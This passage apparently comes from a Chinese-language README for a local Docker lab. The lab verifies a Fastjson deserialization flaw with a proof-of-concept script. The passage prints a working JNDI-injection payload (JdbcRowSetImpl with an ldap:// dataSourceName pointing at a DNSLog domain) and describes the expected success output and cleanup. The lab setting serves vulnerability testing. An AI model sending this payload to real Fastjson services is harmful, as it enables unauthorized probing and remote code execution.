...
./test_poc.sh
脚本执行流程及预期输出
脚本会生成一个形如 fastjson-xxxxxxxx.log.rcs-team.com 的随机域名。
发送如下 Payload 到 http://localhost:8090：
{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<随机域名>/a","autoCommit":true}}
等待 3 秒钟后，请求本地 DNSLog 服务。
预期会在输出中看到：[+] SUCCESS: Vulnerability verified! Found DNSLog record for: ...。
手动浏览器查看 DNSLog 记录：
...
docker compose ps 确认 fastjson-server 和 dnslog-server 正常运行。
确认 fastjson-server 配置了 dns: 172.31.0.53 且网络连通。
清理环境
测试完成后关闭并清理容器：
